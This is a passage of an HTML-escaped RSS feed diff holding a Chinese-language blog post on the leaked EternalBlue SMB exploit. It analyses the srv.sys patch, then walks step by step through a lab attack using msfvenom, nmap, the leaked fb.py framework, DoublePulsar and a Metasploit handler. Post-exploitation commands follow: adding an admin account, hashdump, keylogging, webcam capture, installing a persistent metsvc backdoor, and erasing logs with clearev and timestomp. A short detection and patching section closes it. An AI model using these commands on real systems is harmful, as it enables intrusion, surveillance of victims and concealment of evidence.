+&lt;td align=&#34;center&#34;&gt;SMB和NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP, 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Zippybeer&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMTP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;/&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Esteemaudit&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;RDP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP, Windows Server 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;3389&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;eternalblue攻击原理分析&#34;&gt;ETERNALBLUE攻击原理分析&lt;/h2&gt;
+&lt;p&gt;ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;漏洞发生处：C:\Windows\System32\drivers\srv.sys (注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。&lt;/li&gt;
+&lt;li&gt;漏洞函数：unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2)&lt;/li&gt;
+&lt;li&gt;触发点：_memmove(v5, (const void &lt;em&gt;)(a2 + 5 +&lt;/em&gt; (_BYTE &lt;em&gt;)(a1 + 5)),&lt;/em&gt; (_WORD *)(a1 + 6));&lt;/li&gt;
+&lt;li&gt;原因：逻辑不正确导致的越界写入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;官方补丁修复前：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
+{
+    //SNIP...
+    while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &amp;amp;gt; v4))
+    {
+        *(WORD*)v6 = v3 - (_DWORD)v6; //&amp;lt;----------修改处
+        return v1;
+    }
+    //SNIP...
+}
+int __thiscall ExecuteTransaction(int this)
+{
+    //SNIP...
+    if (*(_DWORD *)(v3 + 0x50) &amp;amp;gt;= 1) //&amp;lt;------修改处
+    {
+        _SrvSetSmbError2(0, 464, &amp;amp;quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&amp;amp;quot;);
+        SrvLogInvalidSmbDirect(v1, v10);
+        goto LABEL_109;
+    }
+    //SNIP...
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修复后：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
+{
+    //SNIP...
+    while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &amp;amp;gt; v4))
+    {
+        *(DWORD*)v6 = v3 - (_DWORD)v6; //&amp;lt;--------修改处
+        return v1;
+    }
+    //SNIP...
+}
+int __thiscall ExecuteTransaction(int this)
+{
+    //SNIP...
+    if (*(_DWORD *)(v3 + 0x50) &amp;amp;gt;= 2u) //&amp;lt;------修改处
+    {
+        _SrvSetSmbError2(0, 464, &amp;amp;quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&amp;amp;quot;);
+        SrvLogInvalidSmbDirect(v1, v10);
+        goto LABEL_109;
+    }
+    //SNIP...
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;具体见参考资料5&lt;/p&gt;
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;strong&gt;漏洞复现&lt;/strong&gt;&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;环境搭建&lt;/p&gt;
+&lt;p&gt;| 主机类型 | OS | IP |
+| :–: | :————: | :———-: |
+| 攻击机1 | win2003 | 10.10.10.130 |
+| 攻击机2 | kali linux 2.0 | 10.10.10.128 |
+| 靶机 | winXP x86 | 10.10.10.129 |&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;工具准备&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;解压NSA工具包中的windows文件夹到攻击机1的C:\目录下（只要不是中文目录皆可）;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在攻击机1安装:&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//www.python.org/download/releases/2.6.6/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;python-2.6.6.msi**&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;pywin32-221.win32-py2.6.exe**&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在攻击机2先生成用于回连的dll&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f dll &amp;gt; x86bind.dll
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.扫描开启445端口的活跃主机并探测操作系统&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -Pn -p445 -O 10.10.10.0/24
+nmap -Pn -p445 -O -iL ip.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.攻击机1开始利用ETERNALBLUE攻击&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python fb.py 
+use Eternalblue ...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.利用Doublepulsar注入dll&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;use Doublepulsar
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;6.kali攻击机利用msf回连控制主机5555端口&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set LPORT 5555
+set RHOST XXX.XXX.XXX.XXX
+exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;后渗透攻击&#34;&gt;&lt;strong&gt;后渗透攻击&lt;/strong&gt;&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;开3389端口&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;wmic /namespace:\root\cimv2\terminalservices path 
+win32_terminalservicesetting where (__CLASS != “”) call 
+setallowtsconnections 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;wmic /namespace:\root\cimv2\terminalservices path 
+win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call 
+setuserauthenticationrequired 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;针对win XP及win2003只需要第3条命令
+针对win 7需要第1，2条命令
+针对win 2012需要3条命令&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;添加账户进管理组&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;net user [username] [password] /add
+net localgroup Administrators [username] /add
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;端口转发如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;portfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX
+rdesktop -u root -p toor 127.0.0.1:4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;meterpreter自带的多功能shell&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文&lt;/li&gt;
+&lt;li&gt;screenshot:获取屏幕截图&lt;/li&gt;
+&lt;li&gt;webcam_snap:调取对方摄像头拍照&lt;/li&gt;
+&lt;li&gt;keyscan_start,keyscan_dump:记录键盘动作&lt;/li&gt;
+&lt;li&gt;ps:查看当前运行进程&lt;/li&gt;
+&lt;li&gt;sysinfo:查看系统信息&lt;/li&gt;
+&lt;li&gt;getsystem:提权&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;维持控制&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;irb client.core.use(&amp;quot;railgun) client.railgun.kernel32.SetThreadExecutionState(&amp;quot;ES_CONTINUOUS|ES_SYSTEM_REQUIRED&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;background:隐藏在后台方便msf终端进行其他操作，session查看对话id&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;session -i X:使用已经成功获取的对话&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;植入后门&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;测试是否虚拟机：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;run post/windows/gather/checkvm
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;metsrv.dll
+run metsvc
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;getgui开启远程桌面：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;run getgui -u sherlly -p sherlly
+run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc //清除痕迹，关闭服务，删除添加账号
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;清除入侵痕迹&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;clearev:清除日志&lt;/li&gt;
+&lt;li&gt;timestomp:修改文件的创建时间，最后写入和最后访问时间timestomp xiugai.doc -f old.doc&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;检测防御&#34;&gt;&lt;strong&gt;检测&amp;amp;防御&lt;/strong&gt;&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;国外有人写了个检测Doublepulsar入侵的脚本，运行环境需要python2.6, 地址&lt;/p&gt;
+&lt;p&gt;countercept/doublepulsar-detection-script**&lt;/p&gt;
+&lt;p&gt;，使用方法&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python detect_doublepulsar_smb.py --ip XXX.XXX.XXX.XXX
+python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另外，nmap也基于该脚本出了对应扫描脚本&lt;/p&gt;
+&lt;p&gt;smb-double-pulsar-backdoor.nse**&lt;/p&gt;
+&lt;p&gt;，使用方法&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -p 445 &amp;lt;target&amp;gt; --script=smb-double-pulsar-backdoor
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;安装相应补丁
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Protecting customers and evaluating risk**&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;如非必要，关闭25, 88, 139, 445, 3389端口&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;参考&#34;&gt;&lt;strong&gt;参考&lt;/strong&gt;&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//thehackernews.com/2017/04/swift-banking-hacking-tool.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Latest Hacking Tools Leak Indicates NSA Was Targeting SWIFT Banking Network&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//www.freebuf.com/sectool/132029.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生 - FreeBuf.COM | 关注黑客与极客**&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//www.cyberscoop.com/nsa-hacking-tools-shadow-brokers-dark-web-microsoft-smb/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Leaked NSA hacking tools are a hit on the dark web - CyberScoop&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//www.file.net/process/srv.sys.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;srv.sys Windows process - What is it?&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;NSA Eternalblue SMB 漏洞分析&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;smb-double-pulsar-backdoor NSE Script&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//jingyan.baidu.com/article/c843ea0b7d5c7177931e4ab1.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;如何设置Windows 7 防火墙端口规则&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
